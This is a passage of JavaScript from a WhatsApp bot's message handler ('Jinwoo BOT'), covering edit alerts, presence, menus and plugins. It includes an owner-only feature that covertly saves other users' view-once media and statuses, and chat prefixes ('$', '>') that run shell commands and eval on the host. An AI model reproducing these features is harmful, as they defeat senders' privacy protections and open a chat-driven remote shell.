        let xtipes = moment(originalMsg.timestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
        let xdptes = moment(originalMsg.timestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");

        let replyText = `🚨 *𝙴𝙳𝙸𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚂𝙴𝙽𝚃 𝙾𝙽: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙴𝙳𝙸𝚃𝙴𝙳 𝙱𝚈: @${editedBy.split('@')[0]}

𝙾𝚁𝙸𝙶𝙸𝙽𝙰𝙻 𝙼𝚂𝙶: ${originalMsg.text}

𝙴𝙳𝙸𝚃𝙴𝙳 𝚃𝙾: ${m.message.protocolMessage?.editedMessage?.conversation || m.message.protocolMessage?.editedMessage?.extendedTextMessage?.text}`

        let quotedMessage = {
            key: {
                remoteJid: chatId,
                fromMe: sender === Jinwoo.user.id,
                id: messageId,
                participant: sender
            },
            message: {
                conversation: originalMsg.text 
            }
        };

        await Jinwoo.sendMessage(Jinwoo.user.id, { text: replyText, mentions: [sender, editedBy] }, { quoted: quotedMessage });

    } catch (err) {
        console.error("❌ Error processing edited message:", err);
    }
} else if (
    global.antiedit === 'chat' &&
    (m.message?.protocolMessage?.editedMessage?.conversation || 
    m.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text)
) {
    try {
        let messageId = m.message.protocolMessage.key.id;
        let chatId = m.chat;
        let editedBy = m.sender;

        let storedMessages = loadStoredMessages();
        let originalMsg = storedMessages[chatId]?.[messageId];

        if (!originalMsg) {
            console.log("⚠️ Original message not found in store.json.");
            return;
        }

        let sender = originalMsg.sender;
        let chatName = chatId.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";

        let xtipes = moment(originalMsg.timestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
        let xdptes = moment(originalMsg.timestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");

        let replyText = `🚨 *𝙴𝙳𝙸𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚂𝙴𝙽𝚃 𝙾𝙽: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙴𝙳𝙸𝚃𝙴𝙳 𝙱𝚈: @${editedBy.split('@')[0]}

𝙾𝚁𝙸𝙶𝙸𝙽𝙰𝙻 𝙼𝚂𝙶: ${originalMsg.text}

𝙴𝙳𝙸𝚃𝙴𝙳 𝚃𝙾: ${m.message.protocolMessage?.editedMessage?.conversation || m.message.protocolMessage?.editedMessage?.extendedTextMessage?.text}`;

        let quotedMessage = {
            key: {
                remoteJid: chatId,
                fromMe: sender === Jinwoo.user.id,
                id: messageId,
                participant: sender
            },
            message: {
                conversation: originalMsg.text 
            }
        };

        await Jinwoo.sendMessage(m.chat, { text: replyText, mentions: [sender, editedBy] }, { quoted: quotedMessage });

    } catch (err) {
        console.error("❌ Error processing edited message:", err);
    }
}
//<================================================>//
if (global.alwaysonline === 'false') {
    if (m.message) {
        try {
            await Jinwoo.sendPresenceUpdate("unavailable", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            console.error('Error sending unavailable presence update:', error);
        }
    }
} else if (global.alwaysonline === 'true') {
    if (m.message) {
        try {
            await Jinwoo.sendPresenceUpdate("available", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            console.error('Error sending available presence update:', error);
        }
    }
}
//=================================================//
if (global.autoread === 'true') {
  Jinwoo.readMessages([m.key]);
}
//<================================================>//
if (
    m.quoted &&
    (m.quoted.viewOnce || m.msg?.contextInfo?.quotedMessage) &&
    (m.message?.conversation || m.message?.extendedTextMessage) &&
    isCreator &&
    ['🌚', '😂', '🥲', '🤔', '🤭', '🍆', '🥵', '🫂', '😳'].some((emoji) => m.body.startsWith(emoji))
) {
    (async () => {
        try {
            let msg = m.msg?.contextInfo?.quotedMessage;
            if (!msg) return console.log('Quoted message not found.');

            let type = Object.keys(msg)[0];
            if (!type || !/image|video/.test(type)) {
                console.log('*Invalid media type!*');
                return;
            }

            const media = await downloadContentFromMessage(
                msg[type],
                type === 'imageMessage' ? 'image' : 'video'
            );

            const bufferArray = [];
            for await (const chunk of media) {
                bufferArray.push(chunk);
            }

            const buffer = Buffer.concat(bufferArray);

            await Jinwoo.sendMessage(
                Jinwoo.user.id,
                type === 'videoMessage'
                    ? { video: buffer, caption: global.wm }
                    : { image: buffer, caption: global.wm },
                { quoted: m }
            );
            
            bufferArray.length = 0; 
            buffer.fill(0);
            msg = null;

        } catch (err) {
            console.error('Error processing media:', err);
        }
    })();
} else if (
   m.message &&
   m.message.extendedTextMessage?.contextInfo?.quotedMessage &&
    !command &&
    isCreator &&
    m.quoted.chat === 'status@broadcast'
) {
    try {
        await m.quoted.copyNForward(Jinwoo.user.id, true);

        console.log('Status forwarded successfully!');
    } catch (err) {
        console.error('Error forwarding status:', err);
    }
}
//=================================================//;
if (
    global.chatbot && global.chatbot === 'true' && 
    (m.message.extendedTextMessage?.text || m.message.conversation) && 
    !isCreator && !m.isGroup && !command
) {
    try {
        const userId = m.sender; 
        const userMessage = m.message.extendedTextMessage?.text || m.message.conversation || ''; 

        if (!userMessage.trim()) {
            return; 
        }

        await Jinwoo.sendPresenceUpdate('composing', m.chat);

        const callFallbackAPI = async () => {
            const apiUrl = `https://bk9.fun/ai/GPT4o`;
            const params = {
                q: userMessage.trim(),
                userId: userId,
            };
            return axios.get(apiUrl, { params });
        };

        const callPrimaryAPI = async () => {
            const apiUrl = `https://bk9.fun/ai/Llama3`;
            const params = {
                q: userMessage.trim(),
                userId: userId,
            };
            return axios.get(apiUrl, { params });
        };

        try {
            const response = await callPrimaryAPI();
            const botResponse = response.data?.BK9;

            if (botResponse) {
                await Jinwoo.sendMessage(m.chat, { text: `${botResponse}` }, { quoted: m });
            }
        } catch (primaryError) {
            console.error('Primary API request failed:', primaryError);

            try {
                const response = await callFallbackAPI();
                const botResponse = response.data?.BK9;

                if (botResponse) {
                    await Jinwoo.sendMessage(m.chat, { text: `${botResponse}` }, { quoted: m });
                }
            } catch (fallbackError) {
                console.error('Fallback API request failed:', fallbackError); 
            }
        }
    } catch (err) {
        console.error('Error processing chatbot request:', err);
    }
}
//<================================================>//
function loadBlacklist() {
    if (!global.db.data.blacklist) {
        global.db.data.blacklist = { blacklisted_numbers: [] };
    }
    return global.db.data.blacklist;
}

const chatId = m.chat;
const userId = m.key.remoteJid;
const blacklist = loadBlacklist();

if ((blacklist.blacklisted_numbers.includes(userId) || blacklist.blacklisted_numbers.includes(chatId)) 
    && userId !== botNumber && !m.key.fromMe) {
    return;
}
//=================================================//
if (["120363321302359713@g.us", "120363381188104117@g.us"].includes(m.chat)) {  
    if (command && !isCreator && !m.key.fromMe) {
        return;
    }
}
//<================================================>//
if (global.mode === 'private') {
  if (command && !isCreator && !m.key.fromMe) return;
} else if (global.mode === 'group') {
  if (command && !m.isGroup && !isCreator && !m.key.fromMe) return;
} else if (global.mode === 'pm') {
  if (command && m.isGroup && !isCreator && !m.key.fromMe) return;
}
//<================================================// 
//mode checker
const modeStatus = 
  global.mode === 'public' ? "Public" : 
  global.mode === 'private' ? "Private" : 
  global.mode === 'group' ? "Group Only" : 
  global.mode === 'pm' ? "PM Only" : "Unknown";
//<================================================>// 
//================== [ FAKE REPLY ] ==================//
const fkontak = {
key: {
participants: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
fromMe: false,
id: "Halo"},
message: {
contactMessage: {
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
}},
participant: "0@s.whatsapp.net"
}

const reply = async(teks) => {
Jinwoo.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          forwardingScore: 9999999,
          isForwarded: true
        }
      }, { quoted: m });
   }
   
const replys = async(teks) => {
m.reply(teks);
}

const reply2 = async(teks) => { 
Jinwoo.sendMessage(m.chat, { text : teks,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: '120363398430045533@newsletter',
serverMessageId: 20,
newsletterName: '❃Jinwoo ᗷOT'
},
externalAdReply: {
title: "Jinwoo ᗷOT", 
body: "",
thumbnailUrl: "https://files.catbox.moe/bqs70b.jpg", 
sourceUrl: null,
mediaType: 1
}}}, { quoted : m })
}
//=================================================//
const { pluginManager } = require('./index');
(async () => {

  const context = {
  Jinwoo, 
  m,        
  reply, 
  args,  
  quoted,
  mime,
  prefix,    
  command,
  text,    
  bad,   
  isCreator, 
  mess, 
  db,       
  botNumber, 
  modeStatus, 
  sleep,     
  isUrl,   
  versions, 
  full_args,
  setHerokuEnvVar,
  getHerokuEnvVars,
  deleteHerokuEnvVar,
  from,
  isAdmins,
  isBotAdmins,
  isGroupOwner,
  participants,
  q,
  store,
  sender,
  botname,
  ownername,
  ownernumber,
  fetchMp3DownloadUrl,
  fetchVideoDownloadUrl,
  saveStatusMessage,
  groupMetadata,
  fetchJson,
  acr,
  obfus,
  from,
  pushname,
  ephoto,
  loadBlacklist,
  mainOwner,
};

  // Process commands
  if (command) {
    try {
      const handled = await pluginManager.executePlugin(context, command);
    } catch (error) {
    console.error('Error executing command:', error.message);
    Jinwoo.sendMessage(Jinwoo.user.id, { text: `An error occurred while executing the command: ${error.message}` });
    }
  }
})();

switch (command) {
//=================================================//
case "menu":
    await react(Jinwoo, m, '🤖'); // 📜 Menu emoji react


const formatMemory = (memory) => {
    return memory < 1024 * 1024 * 1024
        ? Math.round(memory / 1024 / 1024) + ' MB'
        : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
};

const progressBar = (used, total, size = 10) => {
    let percentage = Math.round((used / total) * size);
    let bar = ''.repeat(percentage) + '░'.repeat(size - percentage);
    return `[${bar}] ${Math.round((used / total) * 100)}%`;
};

// **Generate Menu Function**
const generateMenu = (plugins, ownername, prefixz, modeStatus, versions, latensie, readmore) => {
    const memoryUsage = process.memoryUsage();
    const botUsedMemory = memoryUsage.heapUsed;
    const totalMemory = os.totalmem();
    const systemUsedMemory = totalMemory - os.freemem();

    // Memory formatting function
    const formatMemory = (memory) => {
        return memory < 1024 * 1024 * 1024
            ? Math.round(memory / 1024 / 1024) + ' MB'
            : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
    };

    // Memory progress bar (System RAM usage)
    const progressBar = (used, total, size = 10) => {
        let percentage = Math.round((used / total) * size);
        let bar = '▓'.repeat(percentage) + '░'.repeat(size - percentage);
        return `[${bar}] ${Math.round((used / total) * 100)}%`;
    };

    // Count total unique commands across all plugins
    let totalCommands = 0;
    const uniqueCommands = new Set();
    for (const category in plugins) {
        plugins[category].forEach(plugin => {
            if (plugin.command.length > 0) {
                uniqueCommands.add(plugin.command[0]); // Add only the main command
            }
        });
    }
    totalCommands = uniqueCommands.size;

    let menu = `╭──◯ *ᴊɪɴᴡᴏᴏ-v2.5.0* ◯─\n`;
    menu += `┊ 👑 *ᴏᴡɴᴇʀ* : ${ownername}\n`;
    menu += `┊ 🔧 *ᴘʀᴇғɪx* : [ ${prefixz} ]\n`;
    menu += `┊ 🖥️ *ʜᴏsᴛ* : ${os.platform()}\n`;
    menu += `┊ 🧩 *ᴘʟᴜɢɪɴs* : ${totalCommands}\n`;
    menu += `┊ 🌐 *ᴍᴏᴅᴇ* : ${modeStatus}\n`;
    menu += `┊ 📡 *ᴠᴇʀsɪᴏɴ* : ${versions}\n`;
    menu += `┊ ⚡ *sᴘᴇᴇᴅ* : ${latensie.toFixed(4)} ms\n`;
    menu += `┊ 🧠 *ᴜsᴀɢᴇ* : ${formatMemory(botUsedMemory)} of ${formatMemory(totalMemory)}\n`;
    menu += `┊💾 *ʀᴀᴍ:* ${progressBar(systemUsedMemory, totalMemory)}\n`;
    menu += `╰──────────○ \n${readmore}\n`;

    for (const category in plugins) {
        menu += `╭──◐  *${category.toUpperCase()} MENU* ◐──\n`;
        plugins[category].forEach(plugin => {
            if (plugin.command.length > 0) {
                menu += `┆ ◦  ${plugin.command[0]} \n`;
            }
        });
        menu += `╰──────────○ \n\n`;
    }
    return menu;
};

const loadMenuPlugins = (directory) => {
    const plugins = {};

    const files = fs.readdirSync(directory);
    files.forEach(file => {
        if (file.endsWith('.js')) {
            const filePath = path.join(directory, file);
            try {
                delete require.cache[require.resolve(filePath)];
                const pluginArray = require(filePath);
                
                const category = path.basename(file, '.js'); // Extract filename without extension
                if (!plugins[category]) {
                    plugins[category] = [];
                }

                plugins[category].push(...pluginArray); // Spread array to push each plugin individually
            } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
            }
        }
    });

    return plugins;
};

    const techkings = [techking1, techking2, techking3, techking4, techking5][Math.floor(Math.random() * 5)];

    const startTime = performance.now();
    await m.reply("_ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴜ...😹_");
    const endTime = performance.now();
    const latensie = endTime - startTime;

    // Load plugins
    const plugins = loadMenuPlugins(path.resolve(__dirname, './src/plugins'));

    const menulist = generateMenu(plugins, ownername, prefixz, modeStatus, versions, latensie, readmore);

    if (menustyle === '1') {
    await Jinwoo.sendMessage(m.chat, {
        document: {
            url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
        },
        caption: menulist,
        mimetype: "application/zip",
        fileName: `${botname}`,
        fileLength: "9999999",
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: "",
                body: "",
                thumbnail: techkings,
                sourceUrl: plink,
                mediaType: 1,
                renderLargerThumbnail: true,
            },
        },
    }, { quoted: fkontak });

    await Jinwoo.sendMessage(m.chat, {
        audio: kingmalvin,
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: fkontak });

} else if (menustyle === '2') {
    m.reply(menulist);

    await Jinwoo.sendMessage(m.chat, {
        audio: kingmalvin,
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: m });

} else if (menustyle === '3') {
    await Jinwoo.sendMessage(m.chat, {
        text: menulist,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnail: techkings,
                sourceUrl: plink,
                mediaType: 1,
                renderLargerThumbnail: true,
            },
        },
    }, { quoted: m });

    await Jinwoo.sendMessage(m.chat, {
        audio: kingmalvin,
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: m });

} else if (menustyle === '4') {
    await Jinwoo.sendMessage(m.chat, {
        image: techkings,
        caption: menulist,
    }, { quoted: m });

    await Jinwoo.sendMessage(m.chat, {
        audio: kingmalvin,
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: m });

} else if (menustyle === '5') {
    let massage = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: null },
                    footer: { text: menulist },
                    nativeFlowMessage: {
                        buttons: [{ text: null }],
                    },
                },
            },
        },
    }, { quoted: m });

    await Jinwoo.relayMessage(m.chat, massage.message, { messageId: massage.key.id });

    await Jinwoo.sendMessage(m.chat, {
        audio: kingmalvin,
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: m });

} else if (menustyle === '6') {
    await Jinwoo.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'USD',
            requestFrom: '0@s.whatsapp.net',
            amount1000: '1',
            noteMessage: {
                extendedTextMessage: {
                    text: menulist,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        externalAdReply: {
                            showAdAttribution: true,
                        },
                    },
                },
            },
        },
    }, {});

    await Jinwoo.sendMessage(m.chat, {
        audio: kingmalvin,
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: m });
}

    break;
//<================================================>//

default: {
  if (budy.startsWith('$')) {
    if (!isCreator) return;
    exec(budy.slice(2), (err, stdout) => {
      if (err) return m.reply(err);
      if (stdout) return m.reply(stdout);
    });
  }

if (budy.startsWith('>')) {
        if (!isCreator) return;
        try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
            await m.reply(evaled);
        } catch (err) {
            console.error(err); // Log the error to the console
            await m.reply(String(err));
        }
    }

  if (budy.startsWith('=>')) {
    if (!isCreator) return;

    function Return(sul) {
      let sat = JSON.stringify(sul, null, 2);
      let bang = util.format(sat);
      if (sat == undefined) {
        bang = util.format(sul);
      }
      return m.reply(bang);
    }
    try {
      const result = await eval(`(async () => { return ${budy.slice(3)} })()`); // Use an IIFE
      m.reply(util.format(result));
    } catch (e) {
      console.error(e); // Log the error to the console
      m.reply(String(e));
    }
  }
}

}
} catch (err) {
  let formattedError = util.format(err);
  let errorMessage = String(formattedError);

  if (shouldLogError(errorMessage)) {
    if (typeof err === 'string') {
      m.reply(`An error occurred:\n\nError Description: ${errorMessage}`);
    } else {
      console.log(formattedError);
      Jinwoo.sendMessage(Jinwoo.user.id, {
        text: `An error occurred:\n\nError Description: ${errorMessage}`,
        contextInfo: {
          forwardingScore: 9999999,
          isForwarded: true
        }
      }, { ephemeralExpiration: 60 });
    }

    recordError(errorMessage);
  } else {
    console.log(`Repeated error suppressed: ${errorMessage}`);
  }
 }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(color(`Updated '${__filename}'`, 'red'))
  delete require.cache[file]
  require(file)
})